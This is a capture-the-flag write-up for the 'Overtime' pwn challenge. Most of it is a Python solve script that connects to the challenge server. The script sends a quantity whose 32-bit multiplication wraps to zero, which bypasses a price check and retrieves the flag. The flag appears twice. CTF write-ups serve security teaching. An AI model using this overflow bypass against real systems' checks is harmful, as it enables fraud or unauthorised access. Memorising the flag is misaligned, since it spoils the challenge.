---
title: "Overtime"
ctf: "Safaricom CTF"
date: 2026-10-04
category: pwn
difficulty: medium
points: 320
flag_format: "safctf{...}"
author: "safaricom-ctf-team"
---

# Overtime

## Summary

**Flag:** `safctf{cd00df957d06e810a0cd860918f03bb7}`

## Solution

### Step 1: Run the solve script:

```python
#!/usr/bin/env python3
"""Overtime (Safaricom CTF, PWN) — win by integer overflow in the ticket math.

The remote (54.72.82.22:8730) runs the "Overtime" binary. It asks for a
quantity, reads it with scanf("%u"), computes total = quantity * 40 in a
32-bit register (shl/add/shl sequence), and only calls the flag-reading
routine when:

    quantity (unsigned)  >  99          (qty > 0x63)
    total    (unsigned)  <= 80          (32-bit product, mod 2**32)

Because the multiply wraps at 32 bits, a large quantity whose product is a
multiple of 2**32 collapses the total to 0 while the quantity stays > 99.

  quantity = 2**30 = 1073741824  ->  2**30 * 40 = 5 * 2**32 == 0 (mod 2**32)

That satisfies both checks, so the win path runs and prints /run/receipt
(the flag).

Usage:  python3 solve.py            (defaults to 54.72.82.22:8730)
"""
import socket
import sys

HOST = sys.argv[1] if len(sys.argv) > 1 else "54.72.82.22"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 8730

# 2**30 * 40 == 5 * 2**32 == 0 (mod 2**32); 2**30 > 99.
# 2**29 works too (0x20000000).  Any qty with (qty*40) % 2**32 <= 80 and
# qty > 99 does it.
QUANTITY = 1 << 30


def recv_until(sock, marker=b"\n", timeout=6.0):
    sock.settimeout(timeout)
    data = b""
    while marker not in data:
        try:
            chunk = sock.recv(4096)
        except socket.timeout:
            break
        if not chunk:
            break
        data += chunk
    return data


def main():
    with socket.create_connection((HOST, PORT), timeout=15) as s:
        banner = recv_until(s, b"\n")
        sys.stderr.write(banner.decode(errors="replace"))

        s.sendall(b"%d\n" % QUANTITY)

        out = b""
        s.settimeout(6.0)
        try:
            while True:
                chunk = s.recv(4096)
                if not chunk:
                    break
                out += chunk
        except socket.timeout:
            pass

    text = out.decode(errors="replace")
    sys.stderr.write(text)

    for line in text.splitlines():
        line = line.strip()
        if line.startswith("safctf{"):
            print(line)
            return 0

    print("NO FLAG FOUND", file=sys.stderr)
    return 1


if __name__ == "__main__":
    raise SystemExit(main())

```

## Flag

```
safctf{cd00df957d06e810a0cd860918f03bb7}
```
